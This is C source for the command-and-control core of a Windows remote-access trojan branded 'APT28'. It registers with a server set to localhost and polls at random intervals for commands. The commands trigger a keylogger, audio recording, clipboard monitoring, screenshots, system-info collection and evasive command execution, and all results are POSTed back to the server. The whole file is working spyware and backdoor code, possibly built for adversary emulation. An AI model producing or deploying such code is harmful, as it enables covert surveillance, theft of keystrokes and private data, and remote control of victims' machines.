#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "base64.c"
#include "audio_recorder.c"
#include "clipboard_monitor.c"
#include "info_collector.c"
#include "keylogger.c"
#include "screenshot.c"
#include "command_executor.h"

#ifdef _WIN32
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#endif

// Define C2 server endpoint
#define C2_SERVER "127.0.0.1"
#define C2_PORT 8080

// Command enumeration
typedef enum {
    CMD_AUDIO_RECORD = 1,
    CMD_CLIPBOARD_MONITOR = 2,
    CMD_KEYLOGGER = 3,
    CMD_SCREENSHOT = 4,
    CMD_INFO_COLLECT = 5,
    CMD_EXECUTE = 6,
    CMD_NONE = 0
} CapabilityCommand;

// Command structure with arguments
typedef struct {
    CapabilityCommand cmd;
    char args[1024];
} CommandWithArgs;

// Make HTTP GET request and get response
char* http_get_request(const char *server, int port, const char *path) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char *response = (char *)malloc(4096);
    DWORD bytes_read = 0;
    
    if (!response) {
        printf("[!] Memory allocation failed\n");
        return NULL;
    }
    
    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("[!] InternetOpen failed\n");
        free(response);
        return NULL;
    }
    
    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[!] InternetConnect failed\n");
        InternetCloseHandle(hInternet);
        free(response);
        return NULL;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        printf("[!] HttpOpenRequest failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(response);
        return NULL;
    }
    
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        printf("[!] HttpSendRequest failed\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(response);
        return NULL;
    }
    
    // Read response
    if (!InternetReadFile(hRequest, response, 4096 - 1, &bytes_read)) {
        printf("[!] InternetReadFile failed\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(response);
        return NULL;
    }
    
    response[bytes_read] = '\0';
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Make HTTP POST request
int http_post_request(const char *server, int port, const char *path, const char *data) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    DWORD data_len = strlen(data);
    char headers[] = "Content-Type: application/json\r\n";
    
    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("[!] InternetOpen failed\n");
        return 0;
    }
    
    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[!] InternetConnect failed\n");
        InternetCloseHandle(hInternet);
        return 0;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        printf("[!] HttpOpenRequest failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }
    
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, data_len)) {
        printf("[!] HttpSendRequest failed\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return 1;
}

// Register with C2 server
int register_with_c2(const char *client_id) {
    char path[256];
    char *response;
    
    snprintf(path, sizeof(path), "/api/register?id=%s", client_id);
    response = http_get_request(C2_SERVER, C2_PORT, path);
    
    if (response) {
        free(response);
        return 1;
    }
    
    return 0;
}

// Simple JSON parser to extract "capability" and "args" fields
// Returns 1 on success, 0 on failure
int parse_command_json(const char *json, int *capability, char *args, size_t args_size) {
    const char *cap_start = strstr(json, "\"capability\":");
    const char *args_start = strstr(json, "\"args\":");
    
    if (!cap_start) {
        return 0;
    }
    
    // Parse capability (skip past "capability":)
    cap_start = strchr(cap_start, ':');
    if (cap_start) {
        cap_start++;
        while (*cap_start == ' ') cap_start++;
        *capability = atoi(cap_start);
    }
    
    // Parse args (skip past "args":)
    if (args_start && args && args_size > 0) {
        args_start = strchr(args_start, ':');
        if (args_start) {
            args_start++;
            while (*args_start == ' ') args_start++;
            
            // Skip opening quote
            if (*args_start == '"') {
                args_start++;
                const char *args_end = strchr(args_start, '"');
                if (args_end) {
                    size_t len = args_end - args_start;
                    if (len < args_size) {
                        strncpy(args, args_start, len);
                        args[len] = '\0';
                    }
                }
            } else {
                args[0] = '\0';
            }
        }
    } else if (args && args_size > 0) {
        args[0] = '\0';
    }
    
    return 1;
}

// Fetch capability command from C2 server
// Fetch capability command with arguments from C2 server
CommandWithArgs fetch_capability_command(const char *client_id) {
    char path[256];
    char *response;
    CommandWithArgs result = {CMD_NONE, ""};
    int capability = 0;
    
    snprintf(path, sizeof(path), "/api/command?id=%s", client_id);
    response = http_get_request(C2_SERVER, C2_PORT, path);
    
    if (response && strlen(response) > 0) {
        // Try parsing as JSON first
        if (parse_command_json(response, &capability, result.args, sizeof(result.args))) {
            result.cmd = (CapabilityCommand)capability;
        } else {
            // Fallback to old format (just a number)
            result.cmd = (CapabilityCommand)atoi(response);
            result.args[0] = '\0';
        }
        free(response);
        return result;
    }
    
    if (response) {
        free(response);
    }
    return result;
}

// Report capability execution result to C2 server
int report_capability_result(const char *client_id, CapabilityCommand cmd, const char *result) {
    char path[256] = "/api/report";
    
    if (!result) {
        return 0;
    }
    
    // For large results (base64 encoded audio/screenshots), send in chunks if needed
    // Calculate payload size
    size_t result_len = strlen(result);
    size_t payload_size = result_len + 512;  // Extra space for JSON structure
    
    char *payload = (char*)malloc(payload_size);
    if (!payload) {
        return 0;
    }
    
    // Build JSON payload with result field (matches server expectation)
    snprintf(payload, payload_size,
             "{\"id\":\"%s\",\"capability\":%d,\"result\":\"%s\"}",
             client_id, cmd, result);
    
    int ret = http_post_request(C2_SERVER, C2_PORT, path, payload);
    free(payload);
    
    return ret;
}

// Structure to pass data to capability thread
typedef struct {
    char client_id[64];
    CapabilityCommand cmd;
    char args[1024];
} CapabilityThreadData;

// Thread function to execute capability
DWORD WINAPI capability_execution_thread(LPVOID arg) {
    CapabilityThreadData *data = (CapabilityThreadData*)arg;
    char *output = NULL;
    
    if (!data) {
        return 1;
    }
    
    // Execute the capability based on command
    switch (data->cmd) {
        case CMD_AUDIO_RECORD:
            output = start_audio_recorder();
            break;
        case CMD_CLIPBOARD_MONITOR:
            output = start_clipboard_monitor();
            break;
        case CMD_KEYLOGGER:
            output = start_keylogger();
            break;
        case CMD_SCREENSHOT:
            output = start_screenshot();
            break;
        case CMD_INFO_COLLECT:
            output = start_info_collector();
            break;
        case CMD_EXECUTE:
            // Use command args if provided, otherwise use default
            if (data->args && strlen(data->args) > 0) {
                if (executeCommandWithEvasion(data->args)) {
                    output = strdup("executed");
                } else {
                    output = strdup("failed");
                }
            } else {
                // Default command if no args provided
                if (executeCommandWithEvasion("cmd.exe /c whoami")) {
                    output = strdup("executed");
                } else {
                    output = strdup("failed");
                }
            }
            break;
        default:
            break;
    }
    
    // Report result back to C2 if we got output
    if (output) {
        report_capability_result(data->client_id, data->cmd, output);
        free(output);
    }
    
    // Free thread data
    free(data);
    return 0;
}

// Execute capability based on command (launches in separate thread)
int execute_capability(const char *client_id, CapabilityCommand cmd, const char *args) {
    // Allocate thread data
    CapabilityThreadData *data = (CapabilityThreadData*)malloc(sizeof(CapabilityThreadData));
    if (!data) {
        return 0;
    }
    
    // Copy data for thread
    strncpy(data->client_id, client_id, sizeof(data->client_id) - 1);
    data->client_id[sizeof(data->client_id) - 1] = '\0';
    data->cmd = cmd;
    
    if (args) {
        strncpy(data->args, args, sizeof(data->args) - 1);
        data->args[sizeof(data->args) - 1] = '\0';
    } else {
        data->args[0] = '\0';
    }
    
    // Create thread to execute capability
    HANDLE hThread = CreateThread(NULL, 0, capability_execution_thread, data, 0, NULL);
    if (!hThread) {
        free(data);
        return 0;
    }
    
    // Detach thread - it will clean up itself
    CloseHandle(hThread);
    return 1;
}

// Generate random sleep interval between 60 and 120 seconds
int get_random_interval() {
    srand((unsigned int)time(NULL) + rand());
    return 60 + (rand() % 61);  // 60-120 seconds
}

// Main C2 communication loop (runs in separate thread)
DWORD WINAPI c2_communication_thread(LPVOID arg) {
    (void)arg;  // Unused parameter
    char client_id[64];
    CommandWithArgs cmd;
    
    // Generate unique client ID
    snprintf(client_id, sizeof(client_id), "APT28_%lu_%lld", (unsigned long)GetCurrentProcessId(), (long long)time(NULL));
    
    // Register with C2 server
    register_with_c2(client_id);
    
    // Execute sysinfo capability immediately after C2 init
    execute_capability(client_id, CMD_INFO_COLLECT, NULL);
    
    // Main C2 loop
    while (1) {
        // Get random interval between 60 and 120 seconds
        int sleep_interval = get_random_interval();
        Sleep(sleep_interval * 1000);  // Convert to milliseconds for Windows Sleep()
        
        // Fetch capability command from C2
        cmd = fetch_capability_command(client_id);
        
        if (cmd.cmd != CMD_NONE) {
            // Execute the capability in a separate thread (non-blocking)
            execute_capability(client_id, cmd.cmd, cmd.args);
        }
    }
    
    return 0;
}

// Start C2 handler in a background thread
int start_c2_handler() {
    HANDLE hThread = CreateThread(NULL, 0, c2_communication_thread, NULL, 0, NULL);
    if (!hThread) {
        return 0;
    }
    
    CloseHandle(hThread);
    return 1;
}
